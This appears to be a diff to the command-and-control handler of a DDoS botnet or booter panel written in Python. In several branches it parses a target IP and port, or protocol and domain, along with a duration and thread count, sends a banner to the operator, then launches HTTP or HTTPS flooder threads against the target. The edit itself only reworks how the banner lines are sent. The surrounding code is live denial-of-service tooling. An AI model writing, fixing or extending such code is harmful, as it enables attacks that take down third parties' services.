@@ -321,9 +321,14 @@ def cnc(client_socket,address,username):
      command = f'BADGES {username} 2'
     threader = commands[4]
     meth_http = commands[5]
+    count = 0
     for a in methods_icon.split('\n'):
-     send_packet(client_socket%(f'{ip}:{port}',str(times),str(threader),COM),ex=True)
-     time.sleep(0.1)
+     count += 1
+     if count == 8:send_packet(a%(f'{ip}://{port}'),ex=True)
+     elif count == 9:send_packet(a%(str(times)),ex=True)
+     elif count == 10:send_packet(a%(str(threader)),ex=True)
+     elif count == 11:send_packet(a%(COM),ex=True)
+     else:send_packet(a,ex=True)
     threading.Thread(target=apis_flooder_http,args=(ip,port,times,threader,COM,meth_http)).start()
    else:
     send_packet(client_socket,f'{color_char(70)}{COM} {color_char(71)}<{color_char(255)}IP{color_char(71)}> {color_char(71)}<{color_char(255)}PORT{color_char(71)}> {color_char(71)}<{color_char(255)}TIMES{color_char(71)}> {color_char(71)}<{color_char(255)}THREAD{color_char(71)}> {color_char(71)}<{color_char(255)}METHODS_HTTP{color_char(71)}>',remove_=True,ex=True)
@@ -335,9 +340,14 @@ def cnc(client_socket,address,username):
     if 4500 > times:
      command = f'BADGES {username} 2'
     threader = commands[4]
+    count = 0
     for a in methods_icon.split('\n'):
-     send_packet(client_socket%(f'{ip}:{port}',str(times),str(threader),COM),ex=True)
-     time.sleep(0.1)
+     count += 1
+     if count == 8:send_packet(a%(f'{ip}://{port}'),ex=True)
+     elif count == 9:send_packet(a%(str(times)),ex=True)
+     elif count == 10:send_packet(a%(str(threader)),ex=True)
+     elif count == 11:send_packet(a%(COM),ex=True)
+     else:send_packet(a,ex=True)
     threading.Thread(target=apis_flooder_http,args=(ip,port,times,threader,COM,'GET')).start()
    else:
     send_packet(client_socket,f'{color_char(70)}{COM} {color_char(71)}<{color_char(255)}IP{color_char(71)}> {color_char(71)}<{color_char(255)}PORT{color_char(71)}> {color_char(71)}<{color_char(255)}TIMES{color_char(71)}> {color_char(71)}<{color_char(255)}THREAD{color_char(71)}>',remove_=True,ex=True)
@@ -352,9 +362,14 @@ def cnc(client_socket,address,username):
      command = f'BADGES {username} 2'
     threader = commands[4]
     meth_http = commands[5]
+    count = 0
     for a in methods_icon.split('\n'):
-     send_packet(client_socket%(f'{protocol}://{domain}',str(times),str(threader),COM),ex=True)
-     time.sleep(0.1)
+     count += 1
+     if count == 8:send_packet(a%(f'{protocol}://{domain}'),ex=True)
+     elif count == 9:send_packet(a%(str(times)),ex=True)
+     elif count == 10:send_packet(a%(str(threader)),ex=True)
+     elif count == 11:send_packet(a%(COM),ex=True)
+     else:send_packet(a,ex=True)
     threading.Thread(target=apis_flooder_https,args=(protocol,domain,times,threader,COM,meth_http)).start()
    else:
     send_packet(client_socket,f'{color_char(70)}{COM} {color_char(71)}<{color_char(255)}PROTOCOL{color_char(71)}> {color_char(71)}<{color_char(255)}DOMAIN{color_char(71)}> {color_char(71)}<{color_char(255)}TIMES{color_char(71)}> {color_char(71)}<{color_char(255)}THREAD{color_char(71)}> {color_char(71)}<{color_char(255)}METHODS_HTTP{color_char(71)}>',remove_=True,ex=True)
